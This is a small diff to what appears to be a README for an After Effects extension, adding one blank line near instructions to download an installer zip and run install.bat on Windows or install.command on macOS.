@@ -35,6 +35,7 @@ Do NOT install via releases unless you are familiar with the process.
 **[→ Download the installer here](https://github.com/user-attachments/files/27121510/install.zip)**
 
 Run install.bat on Windows or install.command on macOS. It installs the newest version of the extension automatically into your After-Effects, without you needing to doing anything.
+
 ---
 
 **macOS installing**
